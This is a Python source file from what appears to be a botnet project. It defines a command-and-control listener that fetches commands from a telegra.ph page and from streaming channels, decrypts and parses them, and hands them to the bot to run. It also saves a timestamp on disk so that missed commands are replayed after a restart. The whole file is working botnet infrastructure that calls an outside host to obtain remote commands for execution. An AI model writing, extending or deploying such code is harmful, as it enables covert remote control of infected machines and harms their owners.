import requests
import bots.Parser as Parser
from bots.Cryptographic import Cryptographic
import json
import os
from datetime import datetime
import bots.dictionaries.CommunicationChannels as CommunicationChannels

# Returns commands from C2 server
class C2Listener:
    def __init__(self, bot, crypt: Cryptographic):
        self.C2_telegraph_URL = "https://telegra.ph/BNS-TESTING-03-10"
        self.parser = Parser.Parser(crypt)
        self.bot = bot

        self.last_command_time = 0

    # pull commands from C2 server
    def pull_commands(self):
        r = requests.get(self.C2_telegraph_URL)

        if r.status_code == 200:
            command = self.parser.parse_command(r)
            print(f"Bot pulled commands: {command}")
            return command
        else:
            print(f"Bot failed to pull commands.")
            return "None"
        
    # start listening to the commands of the admin
    def start_command_listener(self):
        self.__startup_check_old()

        r = requests.get(url=CommunicationChannels.CommChannels["COMMAND_CHANNEL_DOWNLOAD"], stream=True)

        if r.status_code != 200:
            print(f"Bot failed to pull commands.")
            return "None"
        
        # check all new messages
        for line in r.iter_lines():
            data = json.loads(line)

            if (data["event"] == "message"):
                print (f"Bot pulled command: {data['message']}")
                command = self.parser.parse_command(data["message"])

                self.last_command_time = data["time"]
                with open("Botnet_precistantData.txt", "w") as f:
                    f.write("Last time: " + str(self.last_command_time) +"\n")
                
                self.bot.handle_command(command)
                
                if self.bot.quit == True:
                    return

    # check on startup if there are any past commands you missed
    def __startup_check_old(self):
        # get old messages
        r = requests.get(url=CommunicationChannels.CommChannels["COMMAND_CHANNEL_DOWNLOAD_ALL"], stream=True)

        # check for error
        if r.status_code != 200:
            print(f"Bot failed to pull commands.")
            return "None"
        
        # recover last time
        if os.path.exists("Botnet_precistantData.txt"):
            with open("Botnet_precistantData.txt", "r") as f:
                for line in f:
                    if "Last time: " in line:
                        self.last_command_time = int(line[11:])
        else:
            f = open("Botnet_precistantData.txt", "w")
            f.write("Last time: " + str(int(datetime.now().timestamp())) + "\n")
            f.close()
            self.last_command_time = int(datetime.now().timestamp())

        
        # check each command
        commandsToExecute = []
        for line in r.iter_lines():
            if not line:
                continue

            data = json.loads(line)

            # add the command to the list if it does not cancle a previous command
            if self.last_command_time < data["time"]:
                # set time
                self.last_command_time = data["time"]
                with open("Botnet_precistantData.txt", "w") as f:
                    f.write("Last time: " + str(self.last_command_time) +"\n")
                
                command = self.parser.parse_command(data["message"])

                # check for cancle
                if command[0] == "stop":
                    i = 0
                    while i < len(commandsToExecute):
                        if commandsToExecute[i][0] == "execute":
                            commandsToExecute.pop(i)
                        else:
                            i += 1
                else:
                    commandsToExecute.append(command)
            
        # execute all remaining commands
        for command in commandsToExecute:
            self.bot.handle_command(command)
        

